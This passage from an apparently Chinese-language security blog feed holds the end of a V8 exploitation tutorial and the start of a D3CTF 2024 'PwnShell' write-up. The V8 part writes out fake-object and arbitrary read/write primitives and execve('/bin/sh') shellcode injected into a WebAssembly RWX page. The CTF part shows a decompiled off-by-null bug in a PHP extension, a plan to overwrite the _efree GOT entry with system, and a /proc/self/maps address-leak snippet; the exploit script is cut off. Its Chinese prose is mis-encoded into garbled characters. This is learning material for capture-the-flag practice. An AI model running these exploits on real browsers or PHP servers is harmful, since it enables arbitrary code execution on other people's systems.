object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">// æ²¡æœ‰åŸå‹</span></span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),  <span class="comment">// fake elements ptr</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),  <span class="comment">// fake length</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>ååˆ†ç®€å•çš„å…¥é—¨äº†ä¸€ä¸‹ <code>v8</code> æ¼æ´åˆ©ç”¨ï¼Œè¯¥ç±»æ¼æ´ä»¥åŠåˆ©ç”¨æ–¹å¼è¿˜æœ‰å¾ˆå¤šï¼Œçœ‹æ¥æœ‰çš„å­¦äº†<br>ä»Šå¤© <code>Csome</code> å­¦é•¿åœ¨ <code>defcon</code> æ‹¿äº†ä¸€è¡€ï¼Œå¤ªç‰›æ‹‰  </p><img src="/2024/05/05/v8start/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å“ï¼Œæˆ‘ä¹Ÿæƒ³æˆä¸ºåƒä»–é‚£ä¹ˆå¼ºï¼Œè¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°å•Šã€‚mdï¼Œä¸è¯´é‚£ä¹ˆå¤šäº†ï¼Œå¼€å·ï¼ï¼ï¼<br>å‚è€ƒï¼š<br><a href="https://www.anquanke.com/post/id/267518">https://www.anquanke.com/post/id/267518</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/130124693">https://blog.csdn.net/qq_45323960/article/details/130124693</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/134934993">https://blog.csdn.net/weixin_46483787/article/details/134934993</a><br><a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>D3CTF 2024</title>
      <link href="/2024/04/29/d3ctf2024/"/>
      <url>/2024/04/29/d3ctf2024/</url>
      
        <content type="html"><![CDATA[<h2 id="PwnShell"><a href="#PwnShell" class="headerlink" title="PwnShell"></a>PwnShell</h2><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>å¾ˆä¹…ä»¥å‰å°±å¬è¯´è¿‡ <code>php pwn</code>ï¼Œæ²¡æƒ³åˆ°å°±åœ¨è¿™é‡Œé‡åˆ°äº†ã€‚å‡ºé¢˜äººè‡ªå·±å®ç°äº†ä¸€ä¸ª <code>php</code> æ‰©å±•æ¨¡å— <code>vuln.so</code>ï¼Œå¾ˆæ˜¾ç„¶æ¼æ´å°±æ¥æºäºè¿™é‡Œï¼Œé€šè¿‡é€†å‘åˆ†æå‘ç°å‡ºé¢˜äººåœ¨è¿™ä¸ªæ¨¡å—ä¸­å®ç°çš„èœå•å †ï¼Œå…¶æ¼æ´å‡½æ•°å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v11; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      v6 = &amp;chunkList[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )                        <span class="comment">// å¯»æ‰¾ç©ºé—²å †å—</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 += <span class="number">0x10</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[<span class="number">4</span> * v2];</span><br><span class="line">      v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL) + <span class="number">0x10</span>LL);<span class="comment">// v14å­—ç¬¦ä¸²é•¿åº¦+0x10</span></span><br><span class="line">      v9 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL));<span class="comment">// v15å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">      *v8 = v9;                                 <span class="comment">// å­˜v15çš„åœ°å€</span></span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">0x10</span>LL);<span class="comment">// v15å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">0x18</span>LL);<span class="comment">// v15å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€</span></span><br><span class="line">      v8[<span class="number">1</span>] = v10;                              <span class="comment">// å­˜v15å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);                     <span class="comment">// å¤åˆ¶v15å­—ç¬¦ä¸²å†…å®¹åˆ°v9ä¸­</span></span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">0x18</span>LL), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">0x10</span>LL));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">0x10</span>LL);<span class="comment">// å­˜v14å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">      *(_QWORD *)v7 = v8;</span><br><span class="line">      v7[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">      *((_BYTE *)v8 + v13 + <span class="number">0x10</span>) = <span class="number">0</span>;          <span class="comment">// å­˜åœ¨off by null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆå¯¹éƒ¨åˆ†è¯­å¥è¿›è¡Œä»‹ç»ï¼Œé¦–å…ˆæ˜¯ä¸‹é¢è¿™æ®µä»£ç ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä½œç”¨æ˜¯è·å–å‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€‚æ¥ä¸‹æ¥æ˜¯ <code>zend_parse_parameters</code> å‡½æ•°ï¼Œå…¶å‡½æ•°åŸå‹ä¸ºï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">END_API <span class="type">int</span> <span class="title function_">zend_parse_parameters</span><span class="params">(<span class="type">int</span> num_args, <span class="type">const</span> <span class="type">char</span> *type_spec, ...)</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ é€’çš„å‚æ•°ä¸ªæ•°ã€‚é€šå¸¸ä½¿ç”¨ <code>ZEND_NUM_ARGS()</code> æ¥è·å–ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŒ‡å®šäº†å‡½æ•°æœŸæœ›çš„å„ä¸ªå‚æ•°çš„ç±»å‹ï¼Œåé¢ç´§è·Ÿç€éœ€è¦éšå‚æ•°å€¼æ›´æ–°çš„å˜é‡åˆ—è¡¨ã€‚ å› ä¸º <code>php</code> é‡‡ç”¨æ¾æ•£çš„å˜é‡å®šä¹‰å’ŒåŠ¨æ€çš„ç±»å‹åˆ¤æ–­ï¼Œè¿™æ ·åšå°±ä½¿å¾—æŠŠä¸åŒç±»å‹çš„å‚æ•°è½¬åŒ–ä¸ºæœŸæœ›çš„ç±»å‹æˆä¸ºå¯èƒ½ã€‚<br>ä¸‹è¡¨åˆ—å‡ºäº†å¯èƒ½æŒ‡å®šçš„ç±»å‹ï¼š  </p><table><thead><tr><th>ç±»å‹æŒ‡å®šç¬¦</th><th>å¯¹åº”çš„Cç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td>l</td><td>long</td><td>ç¬¦å·æ•´æ•°</td></tr><tr><td>d</td><td>double</td><td>æµ®ç‚¹æ•°</td></tr><tr><td>s</td><td>char *, int</td><td>äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé•¿åº¦</td></tr><tr><td>b</td><td>zend_bool</td><td>é€»è¾‘å‹ï¼ˆ1æˆ–0ï¼‰</td></tr><tr><td>r</td><td>zval *</td><td>èµ„æºï¼ˆæ–‡ä»¶æŒ‡é’ˆï¼Œæ•°æ®åº“è¿æ¥ç­‰ï¼‰</td></tr><tr><td>a</td><td>zval *</td><td>è”åˆæ•°ç»„</td></tr><tr><td>o</td><td>zval *</td><td>ä»»ä½•ç±»å‹çš„å¯¹è±¡</td></tr><tr><td>O</td><td>zval *</td><td>æŒ‡å®šç±»å‹çš„å¯¹è±¡ã€‚éœ€è¦æä¾›ç›®æ ‡å¯¹è±¡çš„ç±»ç±»å‹</td></tr><tr><td>z</td><td>zval *</td><td>æ— ä»»ä½•æ“ä½œçš„zval</td></tr></tbody></table><p>ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;sl&quot;</span>, &amp;str, &amp;str_len, &amp;n)</span><br></pre></td></tr></table></figure><p>è¯¥è¡¨è¾¾å¼åˆ™æ˜¯è·å–ä¸¤ä¸ªå‚æ•° <code>str</code> å’Œ <code>n</code>ï¼Œå­—ç¬¦ä¸²çš„ç±»å‹æ˜¯ <code>s</code>ï¼Œéœ€è¦ä¸¤ä¸ªå‚æ•° <code>char *</code> å­—ç¬¦ä¸²å’Œ <code>int</code> é•¿åº¦ï¼›æ•°å­—çš„ç±»å‹ <code>l</code> ï¼Œåªéœ€è¦ä¸€ä¸ªå‚æ•°ã€‚<br>ç°åœ¨é‡æ–°å›åˆ°é¢˜ç›®çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ª <code>off by null</code> æ¼æ´ï¼ˆæ³¨é‡Šé‡Œé¢æœ‰å†™ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬å°±è¦å…ˆè®¤è¯†ä¸€ä¸‹ <code>php</code> çš„å †ç»“æ„ã€‚<code>php</code> çš„å †ç»“æ„ç±»ä¼¼äº <code>libc 2.27</code> çš„ <code>tcache</code>ï¼Œ åœ¨ <code>tcache</code> çš„åŸºç¡€ä¸Šåˆ å»äº† <code>head</code> å¤´ã€‚ç”±æ­¤å¯è§ï¼Œ<code>php</code> çš„å †è¿˜æ˜¯æŒºå¥½åˆ©ç”¨çš„ã€‚ç”±äº <code>vuln.so</code> æ¨¡å—çš„ <code>RELRO</code> å¼€å¯çŠ¶æ€ä¸º <code>Partial RELRO</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>off by null</code> æ¼æ´å’Œå †é£æ°´ä¿®æ”¹å †å—çš„ <code>fd</code> æŒ‡é’ˆï¼Œå®ç°ä¿®æ”¹ <code>_efree</code> å‡½æ•°çš„ <code>got</code> è¡¨ä¸º <code>systemï¼Œ</code>ä»è€Œå®ç°ä»»æ„æŒ‡ä»¤çš„æ‰§è¡Œ<br>æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯å¦‚ä½•æ³„éœ²åœ°å€ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ª <code>linux</code> çš„çŸ¥è¯†ã€‚<code>linux</code> ç³»ç»Ÿå†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡ <code>/proc</code> çš„æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶è®¿é—®å†…æ ¸æ•°æ®ï¼Œæ”¹å˜å†…æ ¸è®¾ç½®çš„æœºåˆ¶ã€‚<code>/proc</code> æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯ä»…å­˜åœ¨äºå†…å­˜ä¸­ã€‚<code>/proc</code> ä¸­ä¸€èˆ¬æ¯”è¾ƒé‡è¦çš„ç›®å½•æ˜¯ <code>sys</code>ã€<code>net</code> å’Œ <code>scsi</code>ï¼Œ<code>sys</code> ç›®å½•æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥è®¿é—®å’Œä¿®æ”¹å†…æ ¸çš„å‚æ•° <code>/proc</code> ä¸­æœ‰ä¸€äº›ä»¥ <code>PID</code> å‘½åï¼ˆè¿›ç¨‹å·ï¼‰çš„è¿›ç¨‹ç›®å½•ï¼Œå¯ä»¥è¯»å–å¯¹åº”è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ª <code>/self</code> ç›®å½•ï¼Œç”¨äºè®°å½•æœ¬è¿›ç¨‹çš„ä¿¡æ¯ã€‚ä¹Ÿå³å¯ä»¥é€šè¿‡ <code>/proc/$PID/</code> ç›®å½•æ¥è·å¾—è¯¥è¿›ç¨‹çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•éœ€è¦çŸ¥é“è¿›ç¨‹çš„ <code>PID</code> æ˜¯å¤šå°‘ï¼Œåœ¨ <code>fork</code>ã€<code>daemon</code> ç­‰æƒ…å†µä¸‹ï¼Œ<code>PID</code> å¯èƒ½è¿˜ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ‰€ä»¥ <code>Linux</code> æä¾›äº† <code>self</code> ç›®å½•ï¼Œæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸è¿‡ä¸åŒçš„è¿›ç¨‹æ¥è®¿é—®è¿™ä¸ªç›®å½•è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº <code>/proc/</code> æœ¬è¿›ç¨‹  <code>PID</code> ç›®å½•ä¸‹çš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ <code>self</code> ç›®å½•ç›´æ¥è·å¾—è‡ªèº«çš„ä¿¡æ¯ï¼Œä¸éœ€è¦çŸ¥é“ <code>PID</code>ã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¿™é‡Œåªéœ€è¦è¯»å– <code>/proc/self/maps</code> æ–‡ä»¶å³å¯ã€‚ç„¶åï¼Œåœ¨è¾“å‡ºä¸­å¾—åˆ° <code>libc</code> åœ°å€å’Œ <code>vuln.so</code> çš„åœ°å€ã€‚<br>è¿™é‡Œï¼Œè¿˜éœ€è¦ç”¨åˆ° <code>php</code> çš„ä¸€ä¸ªæŠ€å·§ï¼Œå³ <code>ob</code> å‡½æ•°ã€‚åœ¨ <code>php</code> ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>ob_start</code> æ¥æ‰“å¼€ç¼“å†²åŒºï¼Œç„¶åç¨‹åºçš„è¾“å‡ºæµå°±ä¼šè¢«å­˜å‚¨åˆ°å˜é‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>ob_get_contents</code> æ¥è·å¾— è¾“å‡ºæµï¼Œç„¶åé€šè¿‡æ­£åˆ™åŒ¹é…ä»è¾“å‡ºæµä¸­è·å¾—åœ°å€ã€‚<br>è¿™éƒ¨åˆ†å¯ä»¥å½“ä½œæ¿å­æ¥ç”¨ï¼Œå°±åƒè¿™ä¸€é“é¢˜ç›®ç”¨äºæ³„éœ²åœ°å€çš„ä»£ç ä¸ºï¼š  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>expï¼š  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ 